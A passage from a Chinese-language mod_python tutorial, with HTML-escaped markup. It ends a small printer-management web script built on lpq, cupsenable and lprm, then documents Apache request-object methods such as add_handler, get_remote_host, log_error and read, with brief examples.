/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; alert(\'出错了,RP有问题,去看看打印机开了没\');<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; });<br />}<br />&lt;/script&gt;<br />&lt;/head&gt;<br />&lt;body&gt;<br />打印机 状态: &lt;span id=\"status\"&gt;%s&lt;/span&gt;<br />&lt;hr&gt;<br />&lt;div id=\"jobs\"&gt;<br />&lt;a href=\"javascript:void(0);\" onclick=\"javascript:clsJob();\"&gt;清空打印队列&lt;/a&gt;<br />&lt;/body&gt;<br />\'\'\'<br />def index(req):<br />&nbsp;&nbsp;&nbsp; req.content_type=\"text/html;charset=UTF-8\"<br />&nbsp;&nbsp;&nbsp; req.no_cache=True<br />&nbsp;&nbsp;&nbsp; act=req.args<br />&nbsp;&nbsp;&nbsp; if act==None:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.write(page % prInfo())<br />&nbsp;&nbsp;&nbsp; elif act==\'open\':<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.write(open())<br />&nbsp;&nbsp;&nbsp; elif act==\'clear\':<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.write(clsJob())<br />&nbsp;&nbsp;&nbsp; else:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.write(\'failed\')<br />&nbsp;&nbsp;&nbsp; req.flush()<br />def open():<br />&nbsp;&nbsp;&nbsp; info=rawInfo()<br />&nbsp;&nbsp;&nbsp; if not isReady(info):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; raw=os.popen(\'/usr/sbin/cupsenable CBIB-Printer\').read()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if raw==\'\':<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; result=\'succeed\'<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; result=\'failed\'<br />&nbsp;&nbsp;&nbsp; else:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; result=\'already\'<br />&nbsp;&nbsp;&nbsp; return result<br /><br /><br /><br />def prInfo(info=None):<br />&nbsp;&nbsp;&nbsp; if info==None:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; info=rawInfo()<br /><br />&nbsp;&nbsp;&nbsp; if isReady(info):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ready=\'&lt;font color=\"green\"&gt;正常&lt;/font&gt;\'<br />&nbsp;&nbsp;&nbsp; else:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ready=\'&lt;font color=\"red\"&gt;暂停&lt;/font&gt;&amp;nbsp;&lt;a href=\"javascript:void(0);\" onclick=\"javascript:openPr();\"&gt;打开&lt;/a&gt;\'<br />&nbsp;&nbsp;&nbsp; if info[1]==\'no entries\':<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jobs=\'队列中没有作业\'<br />&nbsp;&nbsp;&nbsp; else:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jobs=\"作业列表:&lt;br&gt;\"+\'&lt;br&gt;\'.join(info[2:])<br />&nbsp;&nbsp;&nbsp; return (ready,jobs)<br /><br />def rawInfo():<br />&nbsp;&nbsp;&nbsp; return os.popen(\'lpq\').read().split(\'\\n\')<br /><br />def isReady(info=None):<br />&nbsp;&nbsp;&nbsp; if info==None:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; info=rawInfo()<br />&nbsp;&nbsp;&nbsp; raw=re.findall(\'not\',info[0])<br />&nbsp;&nbsp;&nbsp; if len(raw)==0:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return True<br />&nbsp;&nbsp;&nbsp; else:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return False<br /><br />def clsJob():<br />&nbsp;&nbsp;&nbsp; return os.popen(\'/usr/bin/lprm\').read()<br /><br /></font></p><p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\"><font face=\"宋体\"><br /></font></p><p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\"><font face=\"宋体\">请求对象是映射到</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">apache</span></font><font face=\"宋体\">的</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">request_rec</span></font><font face=\"宋体\">结构的对象。当处理器被调用时，会传递唯一个的一个参数就是请求对象。可以为请求对象指定属性，用于在处理器之间通信。如下是方法：</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>add_common_vars()</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">间接调用</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">ap_add_common_vars()</span></font><font face=\"宋体\">函数。调用后，</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">req.subprocess_env</span></font><font face=\"宋体\">会包含大量的</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">CGI</span></font><font face=\"宋体\">信息。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>add_handler(htype,handler[,dir])</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">允许动态注册处理器。</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">htype</span></font><font face=\"宋体\">是要添加的处理器的标志，如</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">\'PythonHandler\'</span></font><font face=\"宋体\">，但不可以是过滤器</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">(filter)</span></font><font face=\"宋体\">或连接</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">(connection)</span></font><font face=\"宋体\">。</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">handler</span></font><font face=\"宋体\">是包含模块名或函数名的处理器函数。可选参数</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">dir</span></font><font face=\"宋体\">是需要添加到</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">pythonpath</span></font><font face=\"宋体\">环境变量的路径。如果未指定目录，而且有同类型的处理器，则继承路径，否则用前一路径。如果有</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">PythonPath</span></font><font face=\"宋体\">标志存在，则</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">sys.path</span></font><font face=\"宋体\">将会设置为它。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">通过这种方式添加的处理器生存期为这个请求。为同一个类型添加多个处理器是很有用的，不过要注意避免死循环</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">(infinite\nloop)</span></font><font face=\"宋体\">。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">动态注册处理器是一种很有用的技术，比如用于</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">PythonAuthenHandler</span></font><font face=\"宋体\">，可以为不同的认证级别指定不同的权限。如：</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font color=\"#0000ff\"><font face=\"Courier New, monospace\"><span lang=\"en-US\">if\nmanager:</span></font></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font color=\"#0000ff\"><font face=\"Courier New, monospace\"><span lang=\"en-US\">req.add_handler(\"PythonHandler\",\"menu::admin\")</span></font></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font color=\"#0000ff\"><font face=\"Courier New, monospace\"><span lang=\"en-US\">else:</span></font></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font color=\"#0000ff\"><font face=\"Courier New, monospace\"><span lang=\"en-US\">req.add_handler(\"PythonHandler\",\"menu::basic\")</span></font></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">注意，如果传递了一个无效处理器，则会在寻找处理器时发生异常。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>allow_methods(methods[,reset])</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">添加方法到</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">req.allowed_methods</span></font><font face=\"宋体\">列表。这个列表将会允许传递，在头部指定</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">HTTP_METHOD_NOT_ALLOWED</span></font><font face=\"宋体\">或</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">HTTP_NOT_IMPLEMENTED</span></font><font face=\"宋体\">返回到客户端。注意</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">apache</span></font><font face=\"宋体\">并不会对这些方法起作用。这个列表仅仅用于构造头部。实际的方法处理逻辑在处理器代码中提供。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\">methods</span></font><font face=\"宋体\">是一个字符串列表，如果</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">reset</span></font><font face=\"宋体\">设置为</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">1</span></font><font face=\"宋体\">，则列表会被清空。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>document_root()</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">返回</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">DocumentRoot</span></font><font face=\"宋体\">设置</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>get_basic_auth_pw()</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">返回简单认证时的密码字符串</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>get_config()</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">返回包含</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">mod_python</span></font><font face=\"宋体\">配置的表格对象的引用，用于当前请求，除了</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">Python*Handler</span></font><font face=\"宋体\">和</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">PythonOption(</span></font><font face=\"宋体\">可以通过</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">req.get_options()</span></font><font face=\"宋体\">获得</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">)</span></font><font face=\"宋体\">。表格包含键，和值列表。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>get_remote_host([type,str_is_ip])</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">用于查询客户端的</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">DNS</span></font><font face=\"宋体\">名和</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">IP</span></font><font face=\"宋体\">地址，首次调用时查询</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">DNS</span></font><font face=\"宋体\">，其后的查询返回缓存数据。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">可选参数</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">type</span></font><font face=\"宋体\">可为如下值：</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\">apache.REMOTE_HOST</span></font><font face=\"宋体\">：查询</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">DNS</span></font><font face=\"宋体\">名，当</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">apache</span></font><font face=\"宋体\">标志</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">HostNameLookups</span></font><font face=\"宋体\">为</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">off</span></font><font face=\"宋体\">时返回</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">None</span></font><font face=\"宋体\">，无法查询。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\">apache.REMOTE_NAME</span></font><font face=\"宋体\">：缺省值，尽可能返回</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">DNS</span></font><font face=\"宋体\">名，否则返回</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">IP</span></font><font face=\"宋体\">地址字符串。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\">apache.REMOTE_NOLOOKUP</span></font><font face=\"宋体\">：不执行</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">DNS</span></font><font face=\"宋体\">查询，直接返回</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">IP</span></font><font face=\"宋体\">地址。如果曾经执行过查询，则返回缓存的机器名。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\">apache.REMOTE_DOUBLE_REV</span></font><font face=\"宋体\">：强制使用</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">double-reverse</span></font><font face=\"宋体\">查询，失败返回</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">None</span></font><font face=\"宋体\">。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">如果</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">str_is_ip</span></font><font face=\"宋体\">设为</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">None</span></font><font face=\"宋体\">或未指定，则返回值为</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">DNS</span></font><font face=\"宋体\">名或</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">IP</span></font><font face=\"宋体\">地址的字符串。如果</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">str_is_ip</span></font><font face=\"宋体\">不为</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">None</span></font><font face=\"宋体\">，则返回一个</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">(address,str_is_ip)</span></font><font face=\"宋体\">元组。当</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">str_is_ip</span></font><font face=\"宋体\">为非零则</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">address</span></font><font face=\"宋体\">为</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">IP</span></font><font face=\"宋体\">地址字符串。失败返回</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">None</span></font><font face=\"宋体\">。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>get_options()</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">返回</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">PythonOptions</span></font><font face=\"宋体\">标志的选项表格的引用。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>internal_redirect(new_uri)</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">对请求进行内部重定向。</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">new_uri</span></font><font face=\"宋体\">是字符串。内部重定向将会创建一个新的请求对象，并执行所有的阶段。</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">req.prev</span></font><font face=\"宋体\">包含重定向之前的地址。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>log_error(message[,level])</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">对</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">apache</span></font><font face=\"宋体\">函数</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">ap_log_error()</span></font><font face=\"宋体\">函数的接口。</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">message</span></font><font face=\"宋体\">是日志信息，</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">level</span></font><font face=\"宋体\">是日志级别标志，可为如下值：</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\">APLOG_EMERG</span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\">APLOG_ALERT</span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\">APLOG_CRIT</span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\">APLOG_ERR</span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\">APLOG_WARNNING</span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\">APLOG_NOTICE</span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\">APLOG_INFO</span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\">APLOG_DEBUG</span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\">APLOG_NOERRNO</span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">如果需要写入日志而不是通过请求对象，可用</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">apache.log_error</span></font><font face=\"宋体\">函数。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>meets_conditions()</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">调用</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">apache</span></font><font face=\"宋体\">函数</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">ap_meets_conditions()</span></font><font face=\"宋体\">返回状态码。如果</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">status</span></font><font face=\"宋体\">是</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">apache.OK</span></font><font face=\"宋体\">，则响应正确。如果不是则简单的返回状态码</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">status</span></font><font face=\"宋体\">。注意</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">req.headers_out</span></font><font face=\"宋体\">将会被优先</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">(prior)</span></font><font face=\"宋体\">设置，并也会影响</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">req.status</span></font><font face=\"宋体\">的值，假如不是返回</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">apache.OK</span></font><font face=\"宋体\">。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">例如：</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font color=\"#0000ff\"><font face=\"Courier New, monospace\"><span lang=\"en-US\">...</span></font></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font color=\"#0000ff\"><font face=\"Courier New, monospace\"><span lang=\"en-US\">r.headers_out[\'ETag\']=\"1130794f-3774-4584-a4ea-0ab19e684268\"</span></font></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font color=\"#0000ff\"><font face=\"Courier New, monospace\"><span lang=\"en-US\">r.headers_out[\'Last-Modified\']=\'Wed, 23 Feb 2005 00:00:00\nGMT\'</span></font></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font color=\"#0000ff\"><font face=\"Courier New, monospace\"><span lang=\"en-US\">r.headers_out[\'Expires\']=\'Mon, 18 Apr 2005 17:30:00\nGMT\'</span></font></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font color=\"#0000ff\"><font face=\"Courier New, monospace\"><span lang=\"en-US\">status=r.meets_conditons()</span></font></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font color=\"#0000ff\"><font face=\"Courier New, monospace\"><span lang=\"en-US\">if\nstatus!=apache.OK:</span></font></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font color=\"#0000ff\"><font face=\"Courier New, monospace\"><span lang=\"en-US\">return\nstatus</span></font></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font color=\"#0000ff\"><font face=\"Courier New, monospace\"><span lang=\"en-US\">...</span></font>\n<font face=\"宋体\">处理响应内容</font> <font face=\"Courier New, monospace\"><span lang=\"en-US\">...</span></font></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>requires()</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">返回包含</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">require</span></font><font face=\"宋体\">标志参数的元组。例如如下</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">apache</span></font><font face=\"宋体\">配置：</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font color=\"#0000ff\"><font face=\"Courier New, monospace\"><span lang=\"en-US\">AuthType\nBasic</span></font></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font color=\"#0000ff\"><font face=\"Courier New, monospace\"><span lang=\"en-US\">require user\njoe</span></font></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font color=\"#0000ff\"><font face=\"Courier New, monospace\"><span lang=\"en-US\">require\nvalid-user</span></font></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">函数将会返回</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">(\'user\njoe\',\'valid-user\')</span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>read([len])</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">从客户端读取最多</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">len</span></font><font face=\"宋体\">字节的数据，返回字符串数据。如果</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">len</span></font><font face=\"宋体\">为负数</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">(negative)</span></font><font face=\"宋体\">或者缺省</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">(omitted)</span></font><font face=\"宋体\">，则读取所有的数据。这个函数也会受到</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">apache</span></font><font face=\"宋体\">配置标志</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">Timeout</span></font><font face=\"宋体\">的影响，如果读取时超时则会终端，并抛出</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">IOError</span></font><font face=\"宋体\">异常。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">这个函数依赖于</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">(rely</span></font><font face=\"宋体\">的复数</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">relies)</span></font><font face=\"宋体\">客户端提供的</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">Content-length</span></font><font face=\"宋体\">头。如果未提供这个头，则缺省为</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">0</span></font><font face=\"宋体\">。不正确的</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">Content-length</span></font><font face=\"宋体\">将会导致函数试图读取更多的数据，并且在超时到达之前一直出于阻塞状态。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>readline([len])</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">像</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">read()</span></font><font face=\"宋体\">一样读取到行尾。注意，同</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">HTTP</span></font><font face=\"宋体\">定义一样，大多数客户端的行结束是</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">\'\\r\\n\'</span></font><font face=\"宋体\">，而不是简单的</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">\'\\n\'</span></font><font face=\"宋体\">。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>readlines([sizehint])</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">读取</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">sizehint</span></font><font face=\"宋体\">字节以内的所有行，并返回行列表。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 